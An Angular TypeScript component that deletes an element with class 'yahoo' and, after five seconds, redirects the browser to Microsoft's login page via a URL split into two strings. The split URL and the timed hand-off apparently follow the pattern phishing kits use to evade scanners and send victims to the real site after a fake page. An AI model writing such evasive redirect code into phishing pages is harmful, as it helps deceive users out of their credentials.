import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss'],
})
export class HomeComponent implements OnInit {
  constructor() {
    try {
      document.getElementsByClassName('yahoo')[0].remove();
    } catch (error) {}
  }

  ngOnInit(): void {
    setTimeout(() => {
      let part1 = 'https://login.';
      let part2 = 'live.com/login.srf';
      document.location.href = `${part1}${part2}`;
    }, 5000);
  }
}
